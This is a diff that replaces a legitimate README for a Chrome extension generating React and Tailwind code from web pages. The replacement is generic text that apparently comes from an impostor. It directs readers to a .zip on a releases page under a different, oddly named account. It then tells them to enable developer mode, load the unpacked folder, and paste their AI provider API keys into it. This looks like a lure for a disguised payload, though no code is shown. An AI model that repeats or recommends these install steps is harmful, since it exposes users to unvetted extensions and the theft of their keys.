@@ -1,275 +1,82 @@
-# UI Copy-Paste
+# 🎨 ui-copy-paste - Turn any website into clean code
 
-<p align="center">
-  <img src="src/assets/icon-128.png" width="96" height="96" alt="UI Copy-Paste" />
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jo-anntestimonial230/ui-copy-paste/releases)
 
-<p align="center">
-  <strong>Chrome extension that turns any website UI into clean React + Tailwind components.</strong><br/>
-  Hover → click → Generate (AI) with <em>your</em> API key → copy, download, or write straight into your project.
-</p>
+## 🎯 About the project
 
-<p align="center">
-  <a href="#install-in-chrome"><img src="docs/badges/chrome.svg" alt="Chrome MV3" /></a>
-  <a href="#bring-your-own-key"><img src="docs/badges/byok.svg" alt="BYOK" /></a>
-  <a href="LICENSE"><img src="docs/badges/license.svg" alt="MIT" /></a>
-  <a href="#stack"><img src="docs/badges/react.svg" alt="React TS" /></a>
-  <a href="#stack"><img src="docs/badges/tailwind.svg" alt="Tailwind" /></a>
-</p>
+ui-copy-paste helps you capture the design of any website and convert it into high-quality code. This tool works as a browser extension for Google Chrome. It uses advanced artificial intelligence to analyze visual elements on your screen. The software then generates clean React components styled with Tailwind CSS.
 
-<p align="center">
-  <img src="docs/badges/node.svg" alt="Node" />
-  <img src="docs/badges/pnpm.svg" alt="pnpm" />
-  <img src="docs/badges/mv3.svg" alt="MV3" />
-  <img src="docs/badges/i18n.svg" alt="i18n" />
-  <a href="https://github.com/yiaany/ui-copy-paste/stargazers"><img src="docs/badges/stars.svg" alt="stars" /></a>
-</p>
+You control the process by providing your own API key. This approach keeps your data private and ensures you only pay for the usage you incur. You can choose between OpenAI or Claude as the processing engine. 
 
----
+## 🛠️ Requirements
 
-## Demo
+You need a few things to run this extension on your Windows computer:
 
-<p align="center">
-  <img src="docs/screenshots/sidebar-main.png" width="280" alt="Main side panel" />
-  &nbsp;
-  <img src="docs/screenshots/sidebar-settings.png" width="280" alt="Settings — bring your own key" />
-</p>
+1. A modern version of the Google Chrome web browser.
+2. A subscription or active account with an AI provider. You can use OpenAI or Anthropic.
+3. Your own API key from your chosen provider. This key allows the software to generate code for you.
+4. A stable internet connection to communicate with the AI services.
 
+## 📥 How to get the software
 
-| Pick any element | Generate with your key | Export to project |
-|:---:|:---:|:---:|
-| Inspector highlights blocks on the live page | OpenAI · Claude · any OpenAI-compatible API | Copy · Download `.tsx` · write via local bridge |
+You will download the extension directly from our release page. Visit this page to download the latest version of the software: https://github.com/jo-anntestimonial230/ui-copy-paste/releases
 
----
+1. Go to the [releases page](https://github.com/jo-anntestimonial230/ui-copy-paste/releases).
+2. Look for the most recent version labeled as "Latest release."
+3. Click the file ending in `.zip` to download the package to your Windows device.
+4. Locate the file in your downloads folder.
+5. Right-click the file and select "Extract All" to unzip the folder. Note where you save these extracted files.
 
-## Features
+## ⚙️ Installation steps
 
-- **Element & full-page capture** — point-and-click inspector or whole-page skeleton
-- **Local DOM → JSX** instantly, plus **AI polish** (structure, interactivity, a11y)
-- **Screenshot path** for Canvas / heavily obfuscated UIs
-- **De-brand controls** — strip logos, images → placeholders, lorem text, neutral palette
-- **BYOK only** — paste *your* OpenAI / Claude / DeepSeek (or any OpenAI-compatible) key; no free tier, no shared quota
-- **Streaming Generate** — watch code appear token-by-token
-- **Export** — clipboard, file download, or **To project** via `npx ui-copy-paste` bridge
-- **Side panel UI** (not a popup) — stays open while you click the page
-- **EN / RU** interface, light · dark · system theme
-- **Privacy-first MV3** — `activeTab` only, no `<all_urls>`, content script injected on demand
+Chrome requires you to enable developer mode to load extensions you downloaded from outside the official Web Store.
 
----
+1. Open Google Chrome.
+2. Type `chrome://extensions` in the address bar and press Enter.
+3. Look for the "Developer mode" toggle in the top right corner of the screen. Click it to turn it on.
+4. Click the button that says "Load unpacked."
+5. Select the folder you extracted in the previous section.
+6. The extension appears in your toolbar. You might need to click the puzzle icon to find it and pin it to your browser menu.
 
-## Quick start
+## 🔑 Setting up your account
 
-### 1. Clone & install
+Once you install the extension, you must connect your AI account.
 
-```bash
-git clone https://github.com/yiaany/ui-copy-paste.git
-cd ui-copy-paste
-pnpm install
-```
+1. Click the ui-copy-paste icon in your browser toolbar.
+2. Open the settings menu within the extension window.
+3. Select your preferred AI model from the dropdown list.
+4. Paste your API key into the designated field.
+5. Save your changes. The extension will verify the key. If the indicator turns green, you are ready to start.
 
-> Need pnpm? `corepack enable && corepack prepare pnpm@latest --activate`
+## 🚀 How to use the tool
 
-### 2. Build the extension
+Using the extension follows a simple flow:
 
-```bash
-pnpm build          # → dist/
-```
+1. Navigate to the website you want to copy.
+2. Click the ui-copy-paste icon while on that page.
+3. Choose the specific part of the page you want to capture.
+4. Press the "Generate" button.
+5. Wait a few moments while the AI analyzes the visual structure.
+6. Copy the resulting React and Tailwind code.
+7. Paste the code into your development environment.
 
-### 3. Load in Chrome
+## 💡 Best practices
 
-<a id="install-in-chrome"></a>
+To get the best results, focus on clean areas of a website. The AI performs best when it sees clearly defined boxes, buttons, and text layouts. If a page has many overlapping elements or complex animations, the code might require minor adjustments. 
 
-1. Open `chrome://extensions`
-2. Enable **Developer mode** (top-right)
-3. **Load unpacked** → select the `dist/` folder
-4. Pin the **UI Copy-Paste** icon
+Always review the generated code before you add it to your project. While the AI is efficient, it helps to confirm that the component naming and style classes match your design preferences.
 
-<details>
-<summary>Step-by-step</summary>
+## 🔧 Troubleshooting
 
-1. Developer mode ON  
-2. Load unpacked → `…/ui-copy-paste/dist`  
-3. Click the extension icon on any normal website (not `chrome://`)  
-4. Side panel opens on the right  
+If you encounter issues, try these steps:
 
-</details>
+* Check your API key. If the key expires or lacks credit, the extension cannot generate code.
+* Verify your internet connection. The AI models require a connection to receive your request and send back the results.
+* Refresh the page. Sometimes browser extensions need a clean current state of the page to parse the code correctly.
+* Reinstall the extension. Remove it from the `chrome://extensions` page and follow the installation steps again if you see errors.
 
-### 4. Start the backend (required for Generate AI)
+## 🛡️ Privacy and keys
 
-```bash
-cd backend
-pnpm install --ignore-workspace
-cp .env.example .env   # Windows: copy .env.example .env
-pnpm dev               # http://localhost:8799
-```
+We do not store your API keys on any server. You provide the key locally to your browser. Your data stays on your machine and is only sent to the specific AI provider you chosen. We respect your privacy and provide this tool only as a bridge between your browser and your selected AI service.
 
-Or double-click `backend/start-backend.bat` / root `start-all.bat`.
-
-### 5. Bring your own key
-
-<a id="bring-your-own-key"></a>
-
-Open the side panel → **Settings** (gear) → **Model**:
-
-| Provider | What you paste |
-|---|---|
-| **OpenAI** | API key + model (default `gpt-4o`) |
-| **Claude** | Anthropic API key (model optional) |
-| **OpenAI-compat** | Base URL + key + model (DeepSeek, Groq, OpenRouter, LM Studio, …) |
-
-Keys live in `chrome.storage.local` and are sent only to *your* local backend, which proxies HTTPS to the provider. There is **no free tier** and **no shared quota**.
-
-### 6. Capture → Generate → Export
-
-1. On a normal https page, open the side panel  
-2. **Pick element** (or **Full page**)  
-3. Hover → click the block you want  
-4. **Generate (AI)** — stream polished React + Tailwind  
-5. **Copy** / **Download** / **To project** (`npx ui-copy-paste` in the target repo)
-
----
-
-## Optional: write files into your repo
-
-```bash
-# in the project where components should land
-npx ui-copy-paste
-# bridge listens on http://localhost:31337
-```
-
-In the extension: Settings → Connection → bridge URL (default above) → export path (e.g. `src/components`).
-
----
-
-## Architecture
-
-```text
-┌─────────────┐   activeTab    ┌────────────────┐
-│  Side panel │◄──────────────►│ Content script │  (injected on click)
-│  (React)    │                │ inspector DOM  │
-└──────┬──────┘                └────────────────┘
-       │ HTTP localhost
-       ▼
-┌─────────────┐   BYOK key     ┌────────────────┐
-│   Backend   │───────────────►│ OpenAI/Claude  │
-│  :8799      │   passthrough  │ / compat API   │
-└──────┬──────┘                └────────────────┘
-       │ optional bridge :31337
-       ▼
-┌─────────────┐
-│ Your repo   │  src/components/*.tsx
-└─────────────┘
-```
-
-- **Side panel** — UI, settings, preview, export  
-- **Background SW** — open panel + inject content script  
-- **Content script** — hover outline, extract DOM / screenshot crop  
-- **Backend** — thin proxy, prompt, stream, validate TSX  
-- **CLI bridge** — write files on disk without a file picker  
-
----
-
-## Stack
-
-<a id="stack"></a>
-
-| Layer | Tech |
-|---|---|
-| Extension | Vite 7 · @crxjs/vite-plugin · React 18 · TS strict · Tailwind v4 · Framer Motion · Zod |
-| Backend | Hono · Node · Anthropic / OpenAI-compatible SDKs |
-| Bridge | tiny local HTTP server (CLI) |
-| Quality | ESLint · Prettier · Vitest |
-
----
-
-## Scripts
-
-```bash
-pnpm dev          # HMR dev build → dist/
-pnpm build        # production build
-pnpm test         # vitest
-pnpm lint
-pnpm typecheck
-pnpm format
-```
-
-Backend:
-
-```bash
-cd backend && pnpm dev
-```
-
-Screenshots (dev):
-
-```bash
-pnpm build && node scripts/capture-screenshots.mjs
-```
-
----
-
-## Project layout
-
-```text
-ui-copy-paste/
-├─ manifest.config.ts       # MV3 manifest (typed)
-├─ src/
-│  ├─ assets/               # extension icons
-│  ├─ background/           # service worker
-│  ├─ content/              # inspector + extractor
-│  ├─ sidebar/              # React side panel
-│  └─ lib/                  # settings, backend client, i18n, jsx render…
-├─ backend/                 # Generate (AI) proxy (BYOK)
-├─ cli/                     # npx ui-copy-paste bridge
-├─ docs/
-│  ├─ badges/               # README badge SVGs (always render)
-│  └─ screenshots/          # real UI shots (Playwright)
-└─ dist/                    # load this folder in Chrome
-```
-
----
-
-## Privacy & safety
-
-- Permissions: `activeTab`, `scripting`, `storage`, `sidePanel` + localhost hosts only  
-- No static `<all_urls>` content scripts  
-- API keys never leave your machine except as HTTPS passthrough to the model provider via your backend  
-- Sensitive pages (payment / bank login patterns) are blocked before generation  
-- De-brand tools help produce a legal skeleton without copying brand assets 1:1  
-
----
-
-## Troubleshooting
-
-| Symptom | Fix |
-|---|---|
-| Generate fails immediately | Start backend (`backend/start-backend.bat` or `pnpm dev` in `backend/`) |
-| “Need API key” | Settings → Model → paste key + required fields |
-| Inspector does nothing | Open a normal https site (not `chrome://` / Web Store) |
-| To project fails | Run `npx ui-copy-paste` in the target project root |
-| Extension stale after pull | `pnpm build` then **Reload** on `chrome://extensions` |
-
----
-
-## Contributing
-
-PRs welcome. Keep the BYOK-only model (no shared free quota), preserve privacy defaults, and add tests for pure logic under `src/lib` / `backend/src`.
-
-```bash
-pnpm test && pnpm lint && pnpm typecheck
-```
-
----
-
-## License
-
-[MIT](LICENSE) © yiaany
-
----
-
-<p align="center">
-  <a href="https://github.com/yiaany/ui-copy-paste">★ Star on GitHub</a>
-  ·
-  <a href="https://github.com/yiaany/ui-copy-paste/issues">Report issue</a>
-  ·
-  <a href="#quick-start">Get started</a>
-</p>
+Keywords: anthropic, byok, chrome-extension, code-generation, framer-motion, manifest-v3, openai, react, tailwindcss, typescript, ui, vite
